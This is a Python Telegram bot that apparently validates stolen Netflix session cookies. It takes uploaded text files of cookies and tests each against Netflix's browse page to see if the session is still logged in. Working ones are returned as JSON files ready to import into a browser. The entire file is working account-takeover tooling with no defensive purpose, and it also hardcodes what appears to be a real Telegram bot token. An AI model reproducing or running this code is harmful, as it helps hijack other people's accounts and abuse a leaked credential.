
import os
import json
import logging
import certifi
import tempfile
from http.cookies import SimpleCookie
from itertools import count
from concurrent.futures import ThreadPoolExecutor

import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, ContextTypes, filters

# Load token directly
TELEGRAM_TOKEN = "7311871048:AAGKNhHx-vxa0rH8-3JoHiFftEK7UB8IuuK"

# Set up TLS certificates path
os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
SECURE_HTTPONLY_NAMES = {"NetflixId", "SecureNetflixId"}
logging.basicConfig(level=logging.INFO)

counter = count(1)

def _parse_cookie_header_format(cookie_str: str):
    cookie = SimpleCookie()
    cookie.load(cookie_str)
    return {key: morsel.value for key, morsel in cookie.items()}

def parse_cookie(cookie_str: str):
    cookie_str = cookie_str.strip()
    if cookie_str.startswith('[') or cookie_str.startswith('{'):
        try:
            data = json.loads(cookie_str)
            if isinstance(data, dict):
                data = [data]
            out = {}
            if isinstance(data, list):
                for item in data:
                    if isinstance(item, dict) and 'name' in item and 'value' in item:
                        out[str(item['name'])] = str(item['value'])
            if out:
                return out
        except Exception:
            pass
    return _parse_cookie_header_format(cookie_str)

def is_valid_cookie(cookie_dict):
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.netflix.com/',
        'Origin': 'https://www.netflix.com',
        'Connection': 'keep-alive'
    }
    try:
        r = requests.get('https://www.netflix.com/browse', headers=headers, cookies=cookie_dict, timeout=5)
        return not ('Sign In' in r.text or 'login' in r.url.lower())
    except Exception:
        return False

def _cookie_dict_to_json_style(cookie_dict):
    arr = []
    for name, value in cookie_dict.items():
        secure = name in SECURE_HTTPONLY_NAMES
        http_only = name in SECURE_HTTPONLY_NAMES
        arr.append({
            "name": name,
            "value": value,
            "domain": ".netflix.com",
            "path": "/",
            "secure": secure,
            "httpOnly": http_only
        })
    return arr

async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = update.message.document
    if not file.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file containing cookies.")
        return

    await update.message.reply_text("✅ Received file. Checking cookies... This may take a bit depending on the file size.")
    new_file = await file.get_file()
    temp_path = tempfile.mktemp()
    await new_file.download_to_drive(temp_path)

    with open(temp_path, 'r', encoding='utf-8') as f:
        lines = [line.strip() for line in f if line.strip()]

    def process(cookie_str):
        cookie = parse_cookie(cookie_str)
        if is_valid_cookie(cookie):
            data = _cookie_dict_to_json_style(cookie)
            idx = next(counter)
            temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=f'_working{idx}.txt', mode='w', encoding='utf-8')
            json.dump(data, temp_file, ensure_ascii=False, indent=2)
            temp_file.close()
            return temp_file.name
        return None

    with ThreadPoolExecutor(max_workers=4) as executor:
        results = list(executor.map(process, lines))

    for file_path in results:
        if file_path:
            await context.bot.send_document(chat_id=update.effective_chat.id, document=open(file_path, 'rb'))
            os.remove(file_path)

    os.remove(temp_path)
    await update.message.reply_text("✅ All done!")

if __name__ == "__main__":
    import asyncio
    from telegram.ext import Application

    if not TELEGRAM_TOKEN:
        print("❌ TELEGRAM_TOKEN not set.")
        exit(1)

    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    doc_handler = MessageHandler(filters.Document.ALL, handle_doc)
    app.add_handler(doc_handler)

    print("🤖 Bot is running...")
    app.run_polling()
